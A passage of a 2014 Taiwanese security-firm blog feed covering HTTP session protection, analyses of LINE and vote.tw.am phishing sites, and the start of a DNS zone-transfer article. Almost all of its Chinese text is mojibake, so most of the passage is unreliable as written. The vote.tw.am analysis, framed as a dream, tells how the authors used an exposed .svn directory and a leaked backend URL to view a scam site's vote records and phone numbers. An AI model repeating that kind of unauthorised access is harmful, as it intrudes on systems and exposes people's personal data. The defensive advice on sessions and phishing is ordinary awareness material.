&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;é™¤äº†æª¢æŸ¥å€‹äººè­˜åˆ¥è³‡è¨Šä¾†ç¢ºèªæ˜¯å¦ç›œç”¨ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥å¢åŠ å‰è¿°çš„ Session ID çš„é˜²è­·æ–¹å¼ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie è¨­å®š Secure Flag (HTTPS)&lt;/li&gt;
  &lt;li&gt;Cookie è¨­å®š HTTP Only Flag&lt;/li&gt;
  &lt;li&gt;æˆåŠŸç™»å…¥å¾Œç«‹å³è®Šæ›´ Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Session çš„æ¸…é™¤æ©Ÿåˆ¶ä¹Ÿéå¸¸é‡è¦ã€‚ç•¶ä¼ºæœå™¨åµæ¸¬åˆ°å¯ç–‘çš„ä½¿ç”¨è€… Session è¡Œç‚ºæ™‚ï¼Œä¾‹å¦‚æ”»æ“Šè€…æƒ¡æ„å˜—è©¦å½é€  Session IDã€ä½¿ç”¨è€… Session å¯èƒ½é­ç«Šã€æˆ–è€…é€¾æ™‚ç­‰æƒ…æ³ï¼Œéƒ½æ‡‰è©²ç«‹åˆ»æ¸…é™¤è©² Session ID ä»¥å…è¢«æ”»æ“Šè€…åˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;Session æ¸…é™¤æ©Ÿåˆ¶æ™‚æ©Ÿï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;åµæ¸¬åˆ°æƒ¡æ„å˜—è©¦ Session ID&lt;/li&gt;
  &lt;li&gt;è­˜åˆ¥è³‡è¨Šç„¡æ•ˆæ™‚&lt;/li&gt;
  &lt;li&gt;é€¾æ™‚&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ç®¡ç†è€…æœ‰é¿å…ä½¿ç”¨è€…å¸³è™Ÿé­ç«Šçš„è²¬ä»»&quot;&gt;ç®¡ç†è€…æœ‰é¿å…ä½¿ç”¨è€…å¸³è™Ÿé­ç«Šçš„è²¬ä»»&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨è€…å¸³è™Ÿé­ç«Šä¸€ç›´ä»¥ä¾†éƒ½æ˜¯é¡¯è‘—çš„å•é¡Œï¼Œä½†å»é®®å°‘æœ‰ç¶²ç«™é‡å° Session çš„æ©Ÿåˆ¶é€²è¡Œä¿è­·ã€‚æ”»æ“Šè€…å¯ä»¥è¼•é¬†ä½¿ç”¨ &lt;a href=&quot;http://codebutler.github.io/firesheep/&quot;&gt;firesheep&lt;/a&gt; ä¹‹é¡çš„å·¥å…·ç«Šå–å¸³è™Ÿã€‚åœ‹å¤–å·²ç¶“æœ‰ä¸å°‘ç¶²ç«™åµæ¸¬åˆ° Session å¯èƒ½é­ç«Šæ™‚å°‡å¸³è™Ÿå¼·åˆ¶ç™»å‡ºï¼Œä½†åœ‹å…§ç›®å‰é‚„é®®å°‘ç¶²ç«™å¯¦ä½œæ­¤é˜²ç¦¦ï¼Œè¨­å‚™å•†çš„ Web ç®¡ç†ä»‹é¢æ›´å°‘é‡å° Session é€²è¡Œä¿è­·ã€‚å¦‚æœ VPN Server ç­‰è¨­å‚™æœ‰åµæ¸¬ Session ID çš„å½é€ ï¼Œåœ¨ &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; äº‹ä»¶æ™‚å°±ä¸æœƒæœ‰é‚£éº¼æ…˜é‡çš„æå¤±äº†ã€‚&lt;/p&gt;

&lt;p&gt;ç«‹åˆ»æŠŠè‡ªå·±çš„ç¶²ç«™åŠ ä¸Š Session ä¿è­·æ©Ÿåˆ¶å§ï¼&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/06/03/http-session-protection/</link>
                <guid>https://devco.re/blog/2014/06/03/http-session-protection</guid>
                <pubDate>Tue, 03 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>LINE å…è²»è²¼åœ–é‡£é­šè¨Šæ¯åˆ†æ</title>
                <description>&lt;p&gt;æ™šä¸Šçªç„¶æ¥åˆ°ç¤¾ç¾¤æœ‹å‹å‚³ LINE çš„è¨Šæ¯éä¾†ï¼Œå®šç›ä¸€çœ‹ä¸¦ä¸å–®ç´”ã€‚é€™ç¶²å€çœ‹èµ·ä¾†å°±æ˜¯é‡£é­šç¶²ç«™å•Šï¼Ÿæ€éº¼æœƒé€™æ¨£å‘¢ï¼Ÿé›£é“æ˜¯æœ‹å‹åœ¨æ¸¬è©¦æˆ‘å€‘çš„è­¦è¦ºå¿ƒå¤ ä¸å¤ å—ï¼Ÿè®“æˆ‘å€‘çœ‹ä¸‹å»é€™å€‹é‡£é­šç¶²é æ€éº¼ç©ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot; alt=&quot;LINE å‚³é€è´ˆé€è²¼åœ–è¨Šæ¯é‡£é­š&quot; title=&quot;LINE å‚³é€è´ˆé€è²¼åœ–è¨Šæ¯é‡£é­š&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;æ­¤ LINE é‡£é­šè¨Šæ¯èªªåªè¦å¹«å¿™è½‰ç™¼ 15 æ¬¡è¨Šæ¯ï¼Œå°±æœƒè´ˆé€è²¼åœ–ã€‚å…ˆä¸è«– LINE æœ‰æ²’æœ‰é€™æ¨£çš„æ©Ÿåˆ¶ï¼Œæˆ‘å€‘å…ˆç›´æ¥é»é¸é€£çµçœ‹çœ‹è‘«è˜†è£¡è³£ä»€éº¼è—¥ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot; alt=&quot;LINE é‡£é­šå‡è²¼åœ–ç¶²é &quot; title=&quot;LINE é‡£é­šå‡è²¼åœ–ç¶²é &quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç€è¦½å™¨æ‰“é–‹ä¹‹å¾Œï¼Œè·³å‡ºäº†é ˜å–è²¼åœ–çš„ã€Œç¶²é ã€ï¼Œè€Œä¸”é‚„æœ‰è©­ç•°çš„ç´…å­—ã€‚å„ç¨®è·¡è±¡éƒ½è·Ÿä¸€èˆ¬é ˜å–è²¼åœ–çš„æ¨¡å¼ä¸åŒï¼Œå¤ªä»¤äººèµ·ç–‘äº†ã€‚é»äº†åœ–å°±æœƒè·³åˆ° Facebook ç™»å…¥é é¢ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot; alt=&quot;å‡ Facebook ç™»å…¥é é¢é¨™å–å¸³è™Ÿå¯†ç¢¼&quot; title=&quot;å‡ Facebook ç™»å…¥é é¢é¨™å–å¸³è™Ÿå¯†ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ˜çœ¼äººçœ‹åˆ°é€™å€‹ Facebook ç™»å…¥é é¢å°±æœƒç™¼ç¾å¤ªå‡äº†ï¼Œç ´ç¶»å¤šå¤šã€‚Logoã€ç¶²å€ã€ç¶²é æ ¼å¼ç ´æ¿ã€ç°¡é«”å­—ï¼Œå¤ªå¤šä»¤äººæ‡·ç–‘çš„åœ°æ–¹äº†ã€‚åœ¨é€™é‚Šæˆ‘å€‘åªè¦éš¨ä¾¿è¼¸å…¥å¸³è™Ÿè·Ÿå¯†ç¢¼ï¼Œå°±èƒ½åˆ°ä¸‹å€‹ç•«é¢ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot; alt=&quot;å‡ Facebook ç™»å…¥å®Œæˆé é¢&quot; title=&quot;å‡ Facebook ç™»å…¥å®Œæˆé é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;çµæœç•¶ç„¶æ˜¯ä¸æœƒçµ¦ä½ è²¼åœ–å•¦ï¼è€Œä¸”ç¶²å€ã€Œcuowuã€æ˜¯ã€ŒéŒ¯èª¤ã€çš„æ‹¼éŸ³ï¼Œä¹Ÿæš´éœ²äº†ç¶²ç«™ä½œè€…çš„èº«åˆ†ã€‚ç›´æ¥ç”¨ç€è¦½å™¨çœ‹å‚³éçš„é é¢å«åšã€Œtj.aspã€ï¼Œã€Œtjã€æ­£å¥½æ˜¯ã€Œæäº¤ã€ï¼Œç•«é¢ä¸Šçš„éŒ¯èª¤è¨Šæ¯æ›´æ˜¯å¤§å‰Œå‰Œçš„ç›´æ¥ç§€å‡ºç°¡é«”å­—ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot; alt=&quot;é‡£é­šç¶²ç«™ç¶²é è¨Šæ¯&quot; title=&quot;é‡£é­šç¶²ç«™ç¶²é è¨Šæ¯&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;äº‹å¾Œå‹äººç›´æ¥èªª LINE å¸³è™Ÿè¢«ç›œç”¨ç™¼è¨Šæ¯äº†ï¼Œè€Œä¸”å¯†ç¢¼å¯èƒ½éæ–¼ç°¡å–®ã€ä¹Ÿæ²’æœ‰è¨­å®šæ›æ©Ÿå¯†ç¢¼ã€‚å› æ­¤åœ¨é€™é‚Šå‘¼ç±²å¤§å®¶åšå¥½ LINE çš„å®‰å…¨è¨­å®šï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;åŠ å¼·å¯†ç¢¼é•·åº¦ã€è¤‡é›œåº¦&lt;/li&gt;
  &lt;li&gt;è¨­å®šã€Œæ›æ©Ÿå¯†ç¢¼ã€&lt;/li&gt;
  &lt;li&gt;è‹¥åªåœ¨æ‰‹æ©Ÿä½¿ç”¨ LINEï¼Œå¯å°‡ã€Œå…è¨±è‡ªå…¶ä»–è£ç½®ç™»å…¥ã€é—œé–‰&lt;/li&gt;
  &lt;li&gt;å¦‚æœæœ‰å¸³è™Ÿè¢«ç›œç‹€æ³ï¼Œè¶•å¿«è¯çµ¡ LINE &lt;a href=&quot;https://line.naver.jp/cs/&quot;&gt;https://line.naver.jp/cs/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¤§å®¶åœ¨äº«å—é€šè¨Šè»Ÿé«”èˆ‡æœ‹å‹å‚³è¨Šè²¼åœ–çš„åŒæ™‚ï¼Œä¹Ÿå¿…é ˆè¦æ³¨æ„æœ‰å¿ƒäººå£«åˆ©ç”¨é€™äº›ç®¡é“ç«Šå–ä½ çš„å¸³è™Ÿå¯†ç¢¼å–”ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/12/line-phishing/</link>
                <guid>https://devco.re/blog/2014/05/12/line-phishing</guid>
                <pubDate>Mon, 12 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>æ¶æ­æ ¸å››èˆ‡æœè²¿ç†±æ½®çš„æ½›åœ¨è©é¨™ç¶²ç«™</title>
                <description>&lt;h3 id=&quot;votetwam&quot;&gt;vote.tw.am&lt;/h3&gt;

&lt;p&gt;æœ€è¿‘å¾ˆå¤šäººéƒ½æ”¶åˆ°äº†ä¸€å€‹çœ‹èµ·ä¾†å¾ˆåƒé‡£é­šç¶²ç«™çš„æ ¸å››æŠ•ç¥¨ç«™å°ç°¡è¨Šï¼Œå¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot; alt=&quot;æ ¸å››æŠ•ç¥¨ç«™å°ç°¡è¨Š&quot; title=&quot;æ ¸å››æŠ•ç¥¨ç«™å°ç°¡è¨Š&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä¹Ÿæ”¶åˆ°äº†ï¼Œä½†æ˜¯å‰›åƒé£½é£¯å¯¦åœ¨å¾ˆæƒ³ç¡è¦ºï¼Œä¸å¤ªæƒ³ç†ä»–ï¼Œæ–¼æ˜¯å°±å¿ä¸ä½è¶´ä¸‹ç¡è¦ºï¼Œç«Ÿç„¶åšäº†å€‹å¤¢â€¦..&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ç«™å°å…§å®¹&quot;&gt;ç«™å°å…§å®¹&lt;/h3&gt;

&lt;p&gt;åœ¨å¤¢ä¸­æ‰‹æ»‘æ‰“é–‹äº†ç¶²é ï¼Œå…§å®¹é•·å¾—åƒé€™å€‹æ¨£å­ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot; alt=&quot;æ ¸å››æŠ•ç¥¨ç«™å°é é¢&quot; title=&quot;æ ¸å››æŠ•ç¥¨ç«™å°é é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;çœ‹äº†çœŸæ˜¯éå¸¸çš„ç¾©æ†¤å¡«è†ºï¼é¦¬ä¸Šå°±æƒ³æŠ•ä¸‹ç¥è–çš„ä¸€ç¥¨ï¼ä½†æ˜¯å¿½ç„¶è½åˆ°å‘¨å…¬æŒ‡ç¤ºèªªç¶²ç«™åº•ä¸‹æœ‰å¥‡æ€ªçš„ç›®éŒ„ï¼Œç…§è‘—ç¥è«­ä¸€è©¦ï¼Œç™¼ç¾æœ‰ .svn ç›®éŒ„è·Ÿ entries æª”ï¼&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/3.svn_entries.png&quot; alt=&quot;.svn ç›®éŒ„&quot; title=&quot;.svn ç›®éŒ„&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é€™æ™‚å€™ä¸‰å¤ªå­å“ªå’å‰›å¥½è·¯éï¼Œèªªä»–å‰›å‰›åœ¨ Pastebin çœ‹åˆ°æœ‰äººè²¼äº†&lt;a href=&quot;http://pastebin.com/4iEVWh24&quot;&gt;ä¸€ç¯‡è·Ÿé€™å€‹ç¶²ç«™å¥½åƒæœ‰é—œè¯çš„å…§å®¹&lt;/a&gt;ï¼Œè¬›å®Œä»–å°±é–‹è‘—æ°´è»Šè·‘å»é®å£“é¾å®®äº†ã€‚é»é–‹é‚£ç¯‡å…§å®¹ä¸€çœ‹ï¼Œå…§å®¹æœ‰ä¸€äº›å¾ˆå¥‡æ€ªçš„ç¶²å€ï¼Œè®“äººçœ‹äº†å°±å¾ˆæƒ³é»ï¼éš¨ä¾¿é¸äº†ä¸€å€‹ http://vote.tw.am/2N9E6V4E5R4BABC0647469FF213F2D94A27FA/chose_vote.include.php æ‰“é–‹ä¾†çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/4.vote.tw.am_homepage.png&quot; alt=&quot;æŠ•ç¥¨é …ç›®&quot; title=&quot;æŠ•ç¥¨é …ç›®&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å“‡å¡ï¼åŸä¾†å¾æœè²¿å°±å·²ç¶“é–‹å§‹äº†å‘¢ï¼è®“æˆ‘å€‘ç¹¼çºŒé»é€²å»çœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/5.vote.tw.am_navigation.png&quot; alt=&quot;æŠ•ç¥¨çµæœå°è¦½é é¢&quot; title=&quot;æŠ•ç¥¨çµæœå°è¦½é é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;çœ‹èµ·ä¾†æ˜¯å€‹å¾Œå°ï¼Œå¯ä»¥ç€è¦½ä½¿ç”¨è€…çš„æŠ•ç¥¨è¨˜éŒ„ã€ç•™è¨€ç­‰è³‡æ–™ï¼Œé‚£å°±é»å€‹æŠ•ç¥¨è¨˜éŒ„ä¾†çœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/6.vote.tw.am_vote_record.png&quot; alt=&quot;æŠ•ç¥¨è¨˜éŒ„&quot; title=&quot;æŠ•ç¥¨è¨˜éŒ„&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æœç„¶è£¡é¢å­˜è‘—çœ¾å¤šæ°‘çœ¾çš„æŠ•ç¥¨è¨˜éŒ„ï¼Œé‚£éº¼ç”¨æˆ¶åé¥‹æ‡‰è©²å°±æ˜¯ç•™è¨€äº†â€¦&lt;/p&gt;

&lt;p&gt;å¾é€™äº›å…§å®¹çœ‹ä¾†ï¼Œæ‡‰è©²æ˜¯æœ‰å€‹é›†åœ˜æ“æœ‰å¤§é‡çš„æ°‘çœ¾å€‹è³‡ï¼Œä¸¦ä¸”ä¸€ä¸€ç™¼é€è¨Šæ¯çµ¦é€™äº›äººï¼ŒèƒŒå¾Œç›®çš„å°šä¸å¾—è€ŒçŸ¥ã€‚æœ‰å¯èƒ½æ˜¯å¤§é™¸äººæƒ³åˆ©ç”¨é€™å€‹ç†±æ½®ç¢ºèªé€™äº›é›»è©±è™Ÿç¢¼æ˜¯å¦çœŸå¯¦ã€å¯ç”¨ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸çŸ¥åçš„é»‘æ‰‹æ­£åœ¨ç­–åŠƒä¸‹ä¸€å€‹æ‰“å£“å‹•ä½œï¼Ÿæ­£ç•¶æˆ‘å€‘æƒ³ææ¸…æ¥šå°æ–¹ç©¶ç«Ÿæ˜¯é€éé›»è©±è™Ÿç¢¼é‚„æ˜¯ä¿¡ç®±å‚³é€ iMessage æ™‚ï¼Œå“ªå’å¿½ç„¶åˆè·¯éäº†ï¼Œä¸Ÿäº†é€™å¼µåœ–ä¹‹å¾Œå«æˆ‘å€‘ä¸è¦å†çå¿™äº†è¶•å¿«å›å®¶æ´—æ´—ç¡ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/7.scam.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/7.scam.png&quot; alt=&quot;IPã€æ™‚é–“ã€é›»è©±ã€å›æ‡‰å…§å®¹ç­‰è³‡æ–™&quot; title=&quot;IPã€æ™‚é–“ã€é›»è©±ã€å›æ‡‰å…§å®¹ç­‰è³‡æ–™&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æœç„¶æœ‰é›»è©±ï¼ç©¶ç«Ÿé€™ä»¶äº‹ï¼Œæ˜¯æœ‰ç¶²ç«™å¤§é‡æ´©æ¼å€‹è³‡ï¼Œé‚„æ˜¯æœ‰äººåœ¨æ°‘é‹æœŸé–“åˆ©ç”¨é€™è‚¡ç†±æ½®è’é›†å€‹è³‡ï¼ŒæŠ‘æˆ–æ˜¯èƒŒå¾Œæœ‰ä»€éº¼ä¸å¯å‘Šäººçš„ç§˜å¯†å‘¢ï¼Ÿè®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ï½&lt;/p&gt;

&lt;h3 id=&quot;å¤¢é†’æ™‚åˆ†&quot;&gt;å¤¢é†’æ™‚åˆ†&lt;/h3&gt;

&lt;p&gt;ä¸Šç­æ™‚é–“ä¸èƒ½åˆç¡å¤ªä¹…ï¼Œæ–¼æ˜¯å‘¨å…¬å°±æŠŠæˆ‘å€‘å«é†’äº†â€¦..&lt;/p&gt;

&lt;p&gt;å°æ–¼é€™æ¨£çš„å¤¢å¢ƒæˆ‘å€‘æœ‰ä»¥ä¸‹å»ºè­°ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä¸è¦éš¨æ„é»æ“Šä¾†è·¯ä¸æ˜çš„ç°¡è¨Šå…§å®¹&lt;/li&gt;
  &lt;li&gt;åœ¨ç¶²è·¯ä¸Šå¡«å¯«ä»»ä½•å…§å®¹ä¹‹å‰å…ˆæŸ¥è­‰è©²ç¶²ç«™æ˜¯å¦å¯ç–‘&lt;/li&gt;
  &lt;li&gt;å°æ–¼ yijapperj@hotmail.com é€™ç¨®å¯ç–‘å¸³è™Ÿæ‰€å‚³ä¾†çš„ä»»ä½•è³‡æ–™ï¼Œè«‹ä¿æŒé«˜åº¦è­¦æˆ’&lt;/li&gt;
  &lt;li&gt;å°æ–¼ vote.tw.am é€™ç¨®çœ‹èµ·ä¾†ç–‘ä¼¼è¦å½è£æˆ .tw ç¶²åŸŸçš„ç«™å°ï¼Œä¹Ÿè«‹ä¿æŒé«˜åº¦è­¦æˆ’&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ­¡è¿å¤§å®¶è½‰ç™¼é€™å€‹æ¶ˆæ¯åˆ°å„å¤§ç¶²ç«™ã€ç²‰çµ²åœ˜ã€BBSï¼Œå‘Šè¨´å„å€‹ç†±å¿ƒå…¬ç›Šçš„é„‰æ°‘å€‘åˆ¥å†é»æ“Šèˆ‡å›æ‡‰ä¾†è·¯ä¸æ˜çš„ç°¡è¨Šå›‰ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site/</link>
                <guid>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site</guid>
                <pubDate>Wed, 07 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer CVE-1999-0532 - å¤è€çš„ DNS è³‡å®‰è­°é¡Œ</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Domain_Name_System&quot;&gt;DNS&lt;/a&gt; æ˜¯åœ¨ 1983 å¹´ç”± Paul Mockapetris æ‰€ç™¼æ˜ï¼Œç›¸é—œè¦ç¯„åˆ†åˆ¥åœ¨ &lt;a href=&quot;http://tools.ietf.org/html/rfc1034&quot;&gt;RFC 1034&lt;/a&gt; ä»¥åŠ &lt;a href=&quot;http://tools.ietf.org/html/rfc1035&quot;&gt;RFC 1035&lt;/a&gt;ã€‚å…¶ä¸»è¦ä½œç”¨æ˜¯ç”¨ä¾†è¨˜æ†¶ IP ä½å€èˆ‡è‹±æ–‡ä¹‹é–“çš„å°æ‡‰é—œä¿‚ï¼Œè®“äººé¡å¯ä»¥ç”¨è¼ƒç°¡å–®çš„æ–¹å¼è¨˜å¾—ä¸»æ©Ÿåç¨±ã€‚ç›®å‰ä¸€èˆ¬æ°‘çœ¾å¤§å¤šä½¿ç”¨ ISP æˆ–åœ‹éš›çŸ¥åå…¬å¸æä¾›çš„ DNS serverï¼Œå¦‚ä¸­è¯çš„ 168.95.1.1 æˆ–æ˜¯ Google çš„ 8.8.8.8 ç­‰ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;ç„¶è€Œå°æ–¼ä¼æ¥­è€Œè¨€ï¼Œå¯èƒ½éœ€è¦æ¶è¨­å¤§é‡æ©Ÿå™¨æˆ–å…§éƒ¨ç³»çµ±ï¼Œåˆå¸Œæœ›ä»¥ç°¡å–®çš„æ–¹å¼è¨˜æ†¶ä¸»æ©Ÿåç¨±ï¼Œå› æ­¤è¨±å¤šä¼æ¥­æœ‰è‡ªè¡Œæ¶è¨­ DNS server çš„éœ€æ±‚ã€‚åŒæ™‚ä¼æ¥­é€šå¸¸ä¹Ÿæœƒå»ºç«‹å¹¾å°å‚™æ´ DNS serverï¼Œä»¥é¿å… DNS æœå‹™å¿½ç„¶ä¸­æ–·ã€‚ä½†æ˜¯ç•¶ä¼æ¥­æœ‰å¤šå° DNS server æ™‚ï¼Œå°±å¿…é ˆè€ƒé‡ DNS è¨˜éŒ„çš„åŒæ­¥å•é¡Œï¼Œé€šå¸¸æœƒä½¿ç”¨ &lt;a href=&quot;http://en.wikipedia.org/wiki/DNS_zone_transfer&quot;&gt;zone transfer&lt;/a&gt; é€™å€‹åŠŸèƒ½ä¾†åŒæ­¥è¨˜éŒ„ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ç„¶è€Œè‹¥ç®¡ç†è€…æœªåšå¥½ç›¸é—œè¨­å®šï¼Œä½¿æ‰€æœ‰ä¾†æºçš†å¯å°ä¼æ¥­çš„ DNS ä¸»æ©Ÿé€²è¡Œ zone transfer æŸ¥è©¢ï¼Œå‰‡æœ‰æ©Ÿæœƒè®“æ­¤åŠŸèƒ½æˆç‚ºä¼æ¥­é­å—æ”»æ“Šçš„èµ·é»ã€‚ç”¨ç¾å¯¦ç”Ÿæ´»æƒ…å¢ƒèˆ‰ä¾‹çš„è©±ï¼Œå°å¤–é–‹æ”¾ zone transfer å°±å¦‚åŒæ‰€æœ‰äººéƒ½å¯ä»¥ä»»æ„æŸ¥è©¢ä½ åä¸‹çš„æ‰€æœ‰æˆ¿åœ°ç”¢ä½åœ¨ä½•è™•ï¼Œå‡å¦‚æœ‰äººè¦é‡å°æ€§çš„æ”»æ“Šä½ ï¼Œéš¨æ™‚éƒ½å¯ä»¥å»çœ‹ä½ æŸå€‹æˆ¿åœ°ç”¢æœ‰æ²’æœ‰å“ªæ‰‡é–€çª—æ²’é—œå¥½ï¼Œä¼ºæ©Ÿå…¥ä¾µä½ çš„å®¶åœ’ã€‚ä¸€èˆ¬æˆ‘å€‘å°ä¼æ¥­è³‡è¨Šç³»çµ±é€²è¡Œ&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;æ™‚ï¼Œåœ¨è³‡è¨Šæœé›†çš„éšæ®µä¹Ÿæœƒå…ˆå¾ domain name ä¸‹æ‰‹ï¼Œå› æ­¤ DNS ç›¸é—œè³‡æ–™çš„é‡è¦æ€§å¯è¦‹ä¸€æ–‘ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-1999-0532&quot;&gt;Zone transfer çš„è³‡å®‰è­°é¡Œæ—©åœ¨ 1999 å¹´å°±å·²æœ‰äººæå‡º&lt;/a&gt;ï¼Œç†æ‡‰æˆç‚ºå„ä¼æ¥­é€²è¡Œè³‡å®‰ç¨½æ ¸çš„æ­¥é©Ÿä¹‹ä¸€ã€‚ç„¶è€Œåäº”å¹´éå»äº†ï¼Œåœ¨è¿‘æœŸæˆ‘å€‘å»ç™¼ç¾è¨±å¤šåœ‹å…§å¤§ä¼æ¥­ä»æœ‰æ­¤å•é¡Œï¼Œä»¤äººéå¸¸é©šè¨ï¼ç©¶ç«Ÿä¼æ¥­è©²å¦‚ä½•æª¢æ¸¬è‡ªèº«æ˜¯å¦å­˜åœ¨é€™ç¨®å®‰å…¨æ¼æ´ï¼Ÿæ­¤å•é¡Œç›®å‰åœ¨å°ç£ç¶²è·¯ç’°å¢ƒä½”æœ‰å¤šå¤§çš„æ¯”ä¾‹ï¼ŸZone transfer æœƒå°ä¼æ¥­é€ æˆä»€éº¼å½±éŸ¿ï¼Ÿè®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ï½&lt;/p&gt;

&lt;h3 id=&quot;zone-transfer-æª¢æ¸¬æ–¹å¼&quot;&gt;Zone Transfer æª¢æ¸¬æ–¹å¼&lt;/h3&gt;

&lt;p&gt;é¦–å…ˆéœ€æ„Ÿè¬ &lt;a href=&quot;http://www.digininja.org/&quot;&gt;DigiNinja&lt;/a&gt; æä¾›äº†ä¸€å€‹&lt;a href=&quot;http://www.digininja.org/projects/zonetransferme.php&quot;&gt;è®“å¤§å®¶è‡ªç”±æ¸¬è©¦çš„ zonetransfer.me ç¶²åŸŸ&lt;/a&gt;ï¼Œä»¥ä¸‹æˆ‘å€‘åˆ†åˆ¥åœ¨ Linux åŠ Windows ç’°å¢ƒä¸‹é€²è¡Œæª¢æ¸¬ã€‚&lt;/p&gt;

&lt;h4 id=&quot;linux&quot;&gt;Linux&lt;/h4&gt;

